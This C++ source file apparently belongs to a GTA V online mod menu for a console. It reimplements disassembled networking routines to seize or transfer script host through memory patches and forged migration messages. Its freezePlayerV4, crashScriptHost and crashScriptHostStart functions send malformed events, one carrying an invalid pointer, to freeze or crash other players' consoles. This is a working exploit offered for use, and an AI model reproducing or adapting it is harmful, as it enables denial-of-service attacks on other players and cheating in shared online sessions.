#include "frz.h"
#include "func.h"
#include "Native.h"
#include "scheduler.h"



GtaThread* getCurrentGtaThread() { return Game::invoke<GtaThread*>(0x9B82DC);/*return ((GtaThread*(*)())0x9B82DC)();*/ }
CGameScriptHandlerNetwork* getCurrentCGameScriptHandlerNetwork() { return Game::invoke<CGameScriptHandlerNetwork*>(0x47DEC4);/*return ((CGameScriptHandlerNetwork *(*)())0x47DEC4)();*/ };

CNetGamePlayer *getCNetGamePlayer(int player) {//CEA55F4C  just 0x47E00C is the address... 0x82918F38 on xbox
	opd_s getCNetGamePlayer_t = { 0x1654950, 0x1C85330 };//didn't change
	unsigned int(*getCNetGamePlayer_1)(int entity, int one) = (unsigned int(*)(int, int))&getCNetGamePlayer_t;
	return (CNetGamePlayer*)getCNetGamePlayer_1(player, 1);
}

GtaThread* freemodeScriptGtaThread = 0;
CGameScriptHandlerNetwork* freemodeScriptCGameScriptHandlerNetwork = 0;

int getHostOfFreemodeScript() {
	//encryptFunctionStart(getHostOfFreemodeScript);
	char freemode[] = { 0x3D, 0x29, 0x3E, 0x3E, 0x36, 0x34, 0x3F, 0x3E, 0x5B };//"freemode"
	for (int i = 0; i < sizeof(freemode); i++)
		freemode[i] ^= 0x5b;
	int ret = NETWORK::NETWORK_GET_HOST_OF_SCRIPT(freemode, -1, 0);
	//encryptFunctionEnd();
	return ret;
}


void suggestHost(int mode) {

	if (!VALID_ADDR(getCNetGamePlayer(PLAYER::PLAYER_ID())))
		return;//error cannot do it


	//0x9FC1F4
	int a = 0;
	int b = 0;
	int c = 0;
	switch (mode) {
	case 0:
		//not suggest
		//3C 60 FF FF 60 63 FF FF 4E 80 00 20
		//max for high ping?
		a = 0x3C60FFFF;
		b = 0x6063FFFF;
		c = 0x4E800020;
		*(int*)(((unsigned int)getCNetGamePlayer(PLAYER::PLAYER_ID())) + 0x68) = 0xFFFFFFFF;
		break;
	case 1:
		//highly suggest
		//3C 60 00 00 60 63 00 00 4E 80 00 20
		//0 for low ping?
		a = 0x3C600000;
		b = 0x60630000;
		c = 0x4E800020;
		*(int*)(((unsigned int)getCNetGamePlayer(PLAYER::PLAYER_ID())) + 0x68) = 0x0;
		break;
	default:
		//normal
		//7C 08 02 A6 48 B0 E8 8D F8 21 FF 71
		a = 0x7C0802A6;
		b = 0x48B0E88D;
		c = 0xF821FF71;
		break;
	}
	//printf("Right here! 0x%X\n",getCNetGamePlayer(PLAYER::PLAYER_ID()));

	unsigned int value = 0x9FC1F4;
	*(int*)(value + 0x0) = a;
	*(int*)(value + 0x4) = b;
	*(int*)(value + 0x8) = c;

	/**(int*)0x9FC1F4 = a;
	*(int*)0x9FC1F8 = b;
	*(int*)0x9FC1FC = c;*/

}

char stackData[0x4A0];
StackFrame stack(stackData, sizeof(stackData));


typedef unsigned long long ui64;



__ALWAYS_INLINE int isCNetGamePlayerMe(int r3) {
	int v = *(int*)(r3 + 0x6C);
	v = v & 0x80;//get the highest bit in the last byte
	return (v >> 7);//shift to front
}


ui64 CGameScriptHandlerNetComponent_msgScriptHostRequest(CGameScriptHandlerNetComponent* cGameScriptHandlerNetComponent) {
	ui64 r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0, r12 = 0, r13 = 0, r14 = 0, r15 = 0, r16 = 0, r17 = 0, r18 = 0, r19 = 0, r20 = 0, r21 = 0, r22 = 0, r23 = 0, r24 = 0, r25 = 0, r26 = 0, r27 = 0, r28 = 0, r29 = 0, r30 = 0, r31 = 0;
	r3 = (ui64)cGameScriptHandlerNetComponent;
	char stackData[0x4A0];
	StackFrame stack(stackData, sizeof(stackData));
	r31 = r3;
	if (*(int*)(r3 + 0x8C) <= 0)
		goto loc_A56650;
	r3 = 0x1EC672C;//frameData
	r5 = *(int*)(r3 + 0x10);
	r5 = (int)((int)r4 - (int)r5);
	r4 = 0;
	if (r5 <= 0)
		goto loc_A5664C;
	r4 = r5;
loc_A5664C:
	*(int*)(r31 + 0x8C) = r4;
loc_A56650:
	r3 = *(int*)(r31 + 0x34);
	if (r3 == 0)
		goto loc_A56720;
	r3 = isCNetGamePlayerMe(r3);
	if (r3 == 0)
		goto loc_A56720;
	r3 = *(int*)(r31 + 0xC);
	if (r3 != 0)
		goto ret;
	r4 = *(char*)(r31 + 0xAD);
	r3 = (r4 & 1);
	if (r3 == 0)
		goto loc_A566E4;
	r3 = *(int*)(r31 + 0x8C);
	if (r3 != 0)
		goto ret;
	r3 = *(int*)(0x1CC57B8);//current_CGameScriptHandlerMgr
	r3 = *(int*)(r3 + 0x24);
	if (r3 == 0)
		goto loc_A566D0;
	r3 = *(int*)(r31 + 0x4);
	r4 = *(int*)(r3 + 0x0);
	r4 = *(int*)(r4 + 0x14);//opd struct
	r4 = *(int*)(r4 + 0x0);
	r3 = Game::invoke<ui64>(r4, r3);//at 0xA566B8
	r4 = *(int*)(r3 + 0x0);
	r4 = *(int*)(r4 + 0x18);
	r4 = *(int*)(r4 + 0x0);
	r3 = Game::invoke<ui64>(r4, r3);

loc_A566D0:
	//printf("loc_A566D0\n");
	r4 = 0;
	r3 = r31;
	*(int*)(r31 + 0x34) = r4;
	//r3 = Game::invoke<int>(0xA563E4)(r3);//doN4rage19msgScriptVerifyHost12AutoIdDesc__E
	//This function above isn't necessary anyways so just ignore it
	goto ret;

loc_A566E4:
	//printf("loc_A566E4\n");
	//extrwi    r3, r4, 1,24
	r3 = r4 & 0xFF;//get last 8 bits (32-24)
	r3 = r3 >> 7;//shift it right 8-1 bits
	//end of extrwi command
	if (r3 != 0)
		goto ret;
	r5 = *(int*)r31;
	r3 = r31;
	r7 = *(short*)(r31 + 0x2C);
	r6 = 1;
	r4 = *(int*)(r31 + 0x34);
	r8 = *(int*)(r5 + 0x80);
	r5 = r7 + 1;
	r5 = r5 & 0xFFFF;//clrlwi    r5, r5, 16
	r7 = *(int*)r8;
	r3 = Game::invoke<int>(r7, r3, r4, r5, r6);
	goto ret;

loc_A56720:
	//printf("loc_A56720\n");
	r3 = *(char*)(r31 + 0xAD);
	//extrwi    r3, r3, 1,29
	r3 = r4 & 0x7;//get last 3 bits (0x7 = 0b111)  (32-29)
	r3 = r3 >> 2;//shift it right 3-1 bits
	//end of extrwi command
	if (r3 == 0) {
		//printf("going to ret 1\n");//this was the one called
		//goto ret; turn this off to get it to work :)
	}
	r4 = *(int*)(r31 + 0x1C);
	if (r4 == 0)
		goto loc_A56758;
	r3 = *(int*)(r4 + 0x8);
	if (r3 == 0)
		goto loc_A56758;
	r3 = isCNetGamePlayerMe(r3);//Game::invoke<int>(0x9F8FD8)(r3);//isCNetGamePlayerMe
	r4 = *(int*)(r31 + 0x1C);
	if (r3 != 0) {
		//printf("going to ret 2\n");//this one was not called
		goto ret;
	}

loc_A56758:
	//printf("loc_A56758\n");
	if (r4 == 0)
		goto ret;
	r3 = *(int*)(r4 + 0x8);
	if (r3 == 0)
		goto ret;
	r3 = *(int*)(r31 + 0x8C);
	if (r3 != 0)
		goto ret;
	r3 = *(int*)(r31 + 0x4);
	r4 = *(int*)r3;
	r4 = *(int*)(r4 + 0x14);
	r4 = *(int*)r4;
	r3 = Game::invoke<ui64>(r4, r3);//at 0xA5678C
	r4 = *(int*)(r31 + 0x1C);
	r26 = r3;
	r30 = 0;
	if (r4 == 0)
		goto loc_A567A8;
	r30 = *(int*)(r4 + 0x8);




loc_A567A8:
	//printf("loc_A567A8\n");
	r28 = (ui64)stack.get(0x54);
	r3 = r28;
	Game::invoke<int>(0xA8B814, r3);//initiaterr3forsomething
	r29 = (ui64)stack.get(0x430);
	r3 = r28;
	r4 = r29;
	r5 = 0x3D6;
	Game::invoke<int>(0xA8B908,r3, r4, r5);//at 0xA567C4
	r3 = 0x1EC69C0;// g_N4rage20msgScriptHostRequest12AutoIdDes
	r4 = r28;
	r3 = *(int*)(r3 + 0x8);//the id of the host request
	r3 = Game::invoke<ui64>(0x1626844, r3, r4);//initiateMsgEventSendToOthers

	//printf("Calling host request on %s\n",cGameScriptHandlerNetComponent->cGameScriptHandlerNetwork->gtaThread->threadName);

	r27 = 0;
	if (r3 == 0) {
		goto loc_A56808;
	}
	r5 = *(int*)r26;
	r3 = r26;
	r4 = r28;
	r5 = *(int*)(r5 + 0x20);
	r5 = *(int*)r5;
	Game::invoke<int>(r5, r3, r4);//at 0xA56800
	r27 = 1;


loc_A56808:
	//printf("loc_A56808\n");
	r3 = (ui64)stack.get(0x58);
	if (r3 == 0)
		goto loc_A5682C;
	r3 = 0;
	if (r27 == 0)
		goto loc_A56828;
	r3 = r28;
	r3 = Game::invoke<int>(0xA8B978, r3);//usedOftenInKickStuff

loc_A56828:
	//printf("loc_A56828\n");
	r26 = r3;

loc_A5682C:
	//printf("loc_A5682C\n");
	if (r27 == 0)
		goto loc_A56854;
	r3 = *(int*)(0x1CC4A34);//Game::invoke<ui64>(0x9F8E10)();//sub_9F8E10 get_someNetworkPlayerDataOrSomeShit
	r6 = r26;//clrldi    r6, r26, 32 I think just says r6 = 0
	r8 = (ui64)stack.get(0x38);
	r9 = 0;
	r4 = r30;
	r5 = r29;
	r7 = 1;
	r3 = Game::invoke<ui64>(0x9F8FF0, r3, r4, r5, r6, r7, r8, r9);//sub_9F8FF0

loc_A56854:
	//printf("loc_A56854\n");
	r3 = 0xFA;
	*(int*)(r31 + 0x8C) = r3;


ret:


	//printf("ret\n");
	return r3;

}

unsigned long long get_alternating_value() {
	static int counter = 0; // static variable to keep track of the state
	unsigned long long values[] = { 0x666, 0x777, 0x1A }; // Array of values to alternate
	unsigned long long result = values[counter]; // Get the current value
	counter = (counter + 1) % 3; // Increment and wrap around counter
	return result;
}

ui64 CGameScriptHandlerNetComponent_migrateToCNetGamePlayer(CGameScriptHandlerNetComponent* cGameScriptHandlerNetComponent, CNetGamePlayer* player, bool freezePlayer = false) {
	ui64 r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0, r12 = 0, r13 = 0, r14 = 0, r15 = 0, r16 = 0, r17 = 0, r18 = 0, r19 = 0, r20 = 0, r21 = 0, r22 = 0, r23 = 0, r24 = 0, r25 = 0, r26 = 0, r27 = 0, r28 = 0, r29 = 0, r30 = 0, r31 = 0;

	r3 = (ui64)cGameScriptHandlerNetComponent;
	r4 = (ui64)player;
	char stackData[0x4C0];
	StackFrame stack(stackData, sizeof(stackData));

	//printf("In CGameScriptHandlerNetComponent_migrateToCNetGamePlayer\n");
start:
	r27 = r3;
	r28 = r4;
	r3 = *(int*)(r27 + 0x4);
	r4 = *(int*)r3;
	r4 = *(int*)(r4 + 0x14);
	r4 = *(int*)r4;
	r3 = Game::invoke<int>(r4, r3);
	r24 = *(short*)(r27 + 0x2C);
	r23 = r3;
	//printf("Made it to this location A\n");
	r3 = *(int*)((*(int*)0x1CC4A34/*value: 0x1CC4A34*/) + 0x8C);//sub_9F8268
	r29 = (ui64)stack.get(0x74);
	r26 = *(int*)(r3 + 0x68);
	r3 = r29;
	Game::invoke<int>(0xA8B814, r3);//initiaterr3forsomething
	r30 = (ui64)stack.get(0x450);
	r3 = r29;
	r4 = r30;
	r5 = 0x3D6;
	Game::invoke<int>(0xA8B908/*value: 0xA8B908*/,r3, r4, r5);
	r25 = 0;
	r3 = 0x1EC6980;
	r4 = r29;
	r31 = r25;
	r3 = *(int*)(r3 + 0x8);
	if (freezePlayer)
	{
		for (int i = 0; i < 9; ++i) { // Loop to test the alternation

			r3 = get_alternating_value(); //freeze paradise ventura
			printf("Crash 0x%X", r3);
		}
		/*r3 = 0x12;*/

	}
	//163 did not cause me to receive the event id, oddly enough
	//freeze value is 0x1A
	//struct_MsgTransitionParameters_0x1A
	//0x1A;//try 182 also hmm
	//182 is from freemode
	//185 sets a few values to be checkable bc it calls func_1717()  like StringCopy(&Global_2415118.imm_4, "", 32); --- didn't work based on testing with soprano
	r3 = Game::invoke<ui64>(0x1626844, r3, r4);//initiateMsgEventSendToOthers
	if (r3 == 0)
		goto loc_A58088;
	//printf("Made it to this location B\n");
	r5 = *(int*)r23;
	r3 = r23;
	r4 = r29;
	r5 = *(int*)(r5 + 0x20);
	r5 = *(int*)r5;
	r3 = Game::invoke<ui64>(r5, r3, r4);
	r23 = stack.getArg<char>(0x5C);//make sure this owrks fine
	r3 = r23 & 0x80;
	if (r3 != 0)
		goto loc_A58028;
	r5 = stack.getArg<int>(0x68);
	r3 = stack.getArg<int>(0x6C);
	r4 = (int)r5 + 0x10;
	//printf("Made it to this location C\n");
	if (r4 > r3)
		goto loc_A58028;//I beleive this comparison is the right order
	r3 = r23 & 0x40;
	if (r3 != 0)
		goto loc_A58018;
	r6 = r5;
	r7 = stack.getArg<int>(0x70);
	r4 = r24;
	r5 = 0x10;
	r3 = stack.getArg<int>(0x74);
	r6 = r6 + r7;
	Game::invoke<int>(0xA8B5FC, r3, r4, r5, r6);



loc_A58018:
	//printf("loc_A58018\n");
	r3 = r29;
	r4 = 0x10;
	Game::invoke<int>(0xA8BBBC, r3, r4);
	r23 = stack.getArg<char>(0x5C);

loc_A58028:
	//printf("loc_A58028\n");
	r3 = r23 & 0x80;
	if (r3 != 0)
		goto loc_A58084;
	r5 = stack.getArg<int>(0x68);
	r3 = stack.getArg<int>(0x6C);
	r4 = r5 + 0x20;
	if (r4 > r3)
		goto loc_A58084;
	r3 = r23 & 0x40;
	if (r3 != 0)
		goto loc_A58078;
	r3 = r5;
	r6 = stack.getArg<int>(0x70);
	r7 = stack.getArg<int>(0x74);
	r4 = r26;
	r6 = r3 + r6;
	r5 = 0x20;
	r3 = r7;
	Game::invoke<int>(0xA8B5FC, r3, r4, r5, r6);

loc_A58078:
	//printf("loc_A58078\n");
	r3 = r29;
	r4 = 0x20;
	Game::invoke<int>(0xA8BBBC, r3, r4);

loc_A58084:
	r25 = 1;

loc_A58088:
	//printf("loc_A58088\n");
	r3 = (ui64)stack.get(0x78);
	if (r3 == 0)
		goto loc_A580AC;
	r3 = r31;
	if (r25 == 0)
		goto loc_A580A8;
	r3 = r29;
	r3 = Game::invoke<int>(0xA8B978, r3);//usedOftenInKickStuff

loc_A580A8:
	r26 = r3;

loc_A580AC:
	//printf("loc_A580AC\n");
	if (r25 == 0)
		goto loc_A580D4;
	r3 = *(int*)0x1CC4A34;//someNetworkPlayerDataOrSomeShit get_someNetworkPlayerDataOrSomeShit
	r6 = r26;
	r8 = (ui64)stack.get(0x58);
	r9 = 0;
	r4 = r28;
	r5 = r30;
	r7 = 1;
	//printf("Befoer (addrstruct().privk11^dataDecryptor()^0x711B6FA9)/*value: 0x9F8FF0*/\n");
	Game::invoke<int>(0x9F8FF0, r3, r4, r5, r6, r7, r8, r9);//I wonder if this has more args
	//printf("After (addrstruct().privk11^dataDecryptor()^0x711B6FA9)/*value: 0x9F8FF0*/\n");

loc_A580D4:
	//printf("loc_A580D4\n");
	r5 = 0x2710;
	r6 = *(int*)r27;
	r3 = r27;
	if (!freezePlayer)
		*(int*)(r27 + 0x34) = r28;
	r4 = 0;
	if (!freezePlayer)
		*(int*)(r27 + 0x8C) = r5;
	r5 = 0;
	r7 = *(int*)(r6 + 0x80);
	r6 = 1;
	r7 = *(int*)r7;
	if (!freezePlayer)
		r3 = Game::invoke<ui64>(r7, r3, r4, r5, r6);



ret:
	//printf("End CGameScriptHandlerNetComponent_migrateToCNetGamePlayer\n");
	return r3;
}

ui64 getCEventNetworkAttemptHostMigration(ui64 r3, ui64 r4, ui64 r5) {
	ui64 r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0, r12 = 0, r13 = 0, r14 = 0, r15 = 0, r16 = 0, r17 = 0, r18 = 0, r19 = 0, r20 = 0, r21 = 0, r22 = 0, r23 = 0, r24 = 0, r25 = 0, r26 = 0, r27 = 0, r28 = 0, r29 = 0, r30 = 0, r31 = 0;

	r31 = r3;
	r29 = r4;
	r30 = r5;

	//printf("In getCEventNetworkAttemptHostMigration\n");

	//start of sub_150BB58
	*(int*)(r3 + 0x4) = 0;
	*(int*)(r3 + 0x0) = 0x1888BD0;
	//end of sub_150BB58

	r3 = *(char*)(r31 + 0xC);
	r4 = 0;
	r5 = 0x1894210;
	*(int*)(r31 + 0x8) = 0;
	*(int*)r31 = r5;
	*(int*)(r31 + 0x10) = r29;
	*(char*)(r31 + 0xC) = 0;
	r3 = *(char*)(r30 + 0x29);
	*(int*)(r31 + 0x14) = r3;

	//printf("End getCEventNetworkAttemptHostMigration\n");
	return r3;
}

ui64 sub_483A58(CGameScriptHandlerNetComponent* cGameScriptHandlerNetComponent, CNetGamePlayer* player, bool freeze = false);

ui64 sub_483A58(CGameScriptHandlerNetComponent* cGameScriptHandlerNetComponent, CNetGamePlayer* player, bool freeze) {

	ui64 r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0, r12 = 0, r13 = 0, r14 = 0, r15 = 0, r16 = 0, r17 = 0, r18 = 0, r19 = 0, r20 = 0, r21 = 0, r22 = 0, r23 = 0, r24 = 0, r25 = 0, r26 = 0, r27 = 0, r28 = 0, r29 = 0, r30 = 0, r31 = 0;

	char stackData[0xA0];
	StackFrame stack(stackData, sizeof(stackData));

	//check to make sure they are not already host
	if (cGameScriptHandlerNetComponent->getHost() == player->playerIndex && freeze == false)
		goto ret;

	r3 = (ui64)cGameScriptHandlerNetComponent;
	r4 = (ui64)player;

	//printf("In sub_483A58\n");

	r30 = r3;
	r31 = r4;
	CGameScriptHandlerNetComponent_migrateToCNetGamePlayer(cGameScriptHandlerNetComponent, player, freeze);//Game::invoke<int>(0xA57F28)(r3,r4);
	r3 = *(int*)(r30 + 0x8);
	if (r3 != 0x8)
		goto ret;
	r30 = *(int*)(r30 + 0x4);
	r30 = *(int*)(r30 + 0xC);
	if (r30 == 0)
		goto ret;
	r29 = (ui64)stack.get(0x30);
	r4 = *(int*)(r30 + 0x4);
	r5 = r31;
	r3 = r29;
	r3 = getCEventNetworkAttemptHostMigration(r3, r4, r5);//Game::invoke<int>(0x5816C)(r3,r4,r5);
	r3 = Game::invoke<int>(0x51BA0);//getCurrentCEventGroupScriptNetwork
	r5 = *(int*)(r3 + 0x0);
	r4 = r29;
	r5 = *(int*)(r5 + 0x8);
	r5 = *(int*)(r5 + 0x0);
	r3 = Game::invoke<int>(r5,r3, r4);
	r3 = r29;
	r4 = 0x1888BE0;// N4rage14fwRefAwareBaseE
	stack.setArg<int>(0x30, r4);
	r3 = Game::invoke<int>(0x150BAA4, r3);//callTriggerScriptEventSelf
ret:
	//printf("End sub_483A58\n");
	return r3;
}

bool setScriptHost(CGameScriptHandlerNetwork* script, int player = -1) {
	//player = PLAYER::PLAYER_ID();//choosing other players doesn't work
	bool ret = false;
	if (script != 0) {//had to add this 0 check because it was freezing sometimes if you had auto kick on when during a transition and it tried to kick but it was 0 here. It's pretty much confirmed this was the functiion it was. The function only had one arg, had encryption, called player_id (verified by invoke hash), then crashed grabbing 0x24 from first arg
		if (script->cGameScriptHandlerNetComponentSyncOne != 0) {
			if (player == PLAYER::PLAYER_ID()) {
				//set the suggested host to default
				suggestHost(2);

				//this one from further testing seems to do nothing
				CGameScriptHandlerNetComponent_msgScriptHostRequest(script->cGameScriptHandlerNetComponentSyncOne);  //might be able to call this remotely via an event
				//Game::invoke<int>(/*0xA57F28*/0x483A58)(script->cGameScriptHandlerNetComponentSyncOne,getCNetGamePlayer(player));

				//this one does the real bulk. will always set host to me unless suggestHost(0) is called
				//this next one is local... only updates it for our system. Use this to make it swap to use quicker
				sub_483A58(script->cGameScriptHandlerNetComponentSyncOne, getCNetGamePlayer(player));//send_msgScriptMigrateHost this is like used in the thing
				//this handles the automatic changes when players join the lobby
				//this is probably not able to call remotely, since it is based on
				//the network speed or whatever
			}
			else {

				//just set the suggested host to false, and it will swap eventually
				suggestHost(0);
				//*(int*)(((unsigned int)getCNetGamePlayer(player)) + 0x68) = 0x0;


				//other player, use the function in the code
				//doCEventNetworkHostMigration
				//send_msgScriptMigrateHost should be like the real one that tells it to change the host because it has a send event in it...
				//sub_483A58(script->cGameScriptHandlerNetComponentSyncOne,getCNetGamePlayer(player));//this function is called before the other one when someone 'automatically' (as in right after they join the lobby and iti switches to them sometimes) get the host transferred to them

				//short weirdval = *(short*)(((int)script->cGameScriptHandlerNetComponentSyncOne)+0x2C);
				//Game::invoke<int>(0x483F50)(script->cGameScriptHandlerNetComponentSyncOne,VALID_ADDR(getCNetGamePlayer(player))?getCNetGamePlayer(player):0,weirdval,0);

				//CGameScriptHandlerNetComponent
				//script->cGameScriptHandlerNetComponentSyncOne + 0x34 = cnetgameplayer host
			}
			ret = true;
		}
	}
	return ret;
}

bool assureHostOfFreemode(int player) {
	if (I_AM_ONLINE) {
		if (getHostOfFreemodeScript() != player) {
			if (freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne != 0) {
				setScriptHost(freemodeScriptCGameScriptHandlerNetwork, player);
			}
		}
		else {
			//I am host of script
			return true;
		}
	}
	return false;
}


//give host to player
void giveHostToPlayer(int player) {
	//printf("Requesting host...\n"); 
	if (freemodeScriptCGameScriptHandlerNetwork != 0) {
		suggestHost(0);//make it so host gets transferred to the other guy now
		if (player == PLAYER::PLAYER_ID())
			suggestHost(1);//highly suggest
		if (getHostOfFreemodeScript() != player) {
			CNetGamePlayer* cnet = getCNetGamePlayer(player);
			if (cnet != 0) {
				
				CGameScriptHandlerNetComponent_msgScriptHostRequest(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne);//g_N4rage20msgScriptHostRequest12AutoIdDes  THIS VERIFIES ME AS HOST IM PRETTY SURE AND 

				//This one is the actual one that requests the script host change to the player, but I beleive it also compares my time so i have to do suggestHost(0) first and if i dont then it will go back to me
				sub_483A58(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne, cnet);//global_msgScriptMigrateHost
			}
		}
	}
}





//freeze console
void nullFunc(int i) {};


//int getHostOfFreemodeScript() esta na linha 12 mas era pra estar aqui mas funciona do mesmo jeito :0


void freezePlayerV4(int player) {
	//Created 4/25/2020
	CNetGamePlayer* cnet = getCNetGamePlayer(player);
	if (VALID_ADDR(cnet))
		sub_483A58(freemodeScriptCGameScriptHandlerNetwork->cGameScriptHandlerNetComponentSyncOne, cnet, true);
}
int idkkkkkkkkk;

void crashScriptHost(int player)
{
	idkkkkkkkkk = player;
	if (getHostOfFreemodeScript() != player) {
	}
	else {
		//only works on lobby scritp host, will crash them inside the jenkins hash function on set_override_weather
		char* weatherValuePointer = (char*)0x4;//0 = null pointer, it's a broken script event and accepts pointer for some reason... 0 wont work tho cuz it will bypass the 0 on the func, try a different invalid address like 0x4
		ScriptArg args[3] = { 16, player, (int)weatherValuePointer };
		unsigned int playerBit = (1 << player);
		SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 3, playerBit);
	}

	scheduler::once(scheduler::renderer, []
	{
		freezePlayerV4(idkkkkkkkkk);
	}, 100);
}
void crashScriptHostStart(int player) {
	idkkkkkkkkk = player;
	CNetGamePlayer* cnet = getCNetGamePlayer(player);
	if (!assureHostOfFreemode(PLAYER::PLAYER_ID()) || cnet == 0) {
		printf("~r~Please try again");

	}
	else
	{
		giveHostToPlayer(player);
		scheduler::once(scheduler::renderer, []
		{
			crashScriptHost(idkkkkkkkkk);
		}, 200);
		printf("~g~Player Frozen!");
	}
}
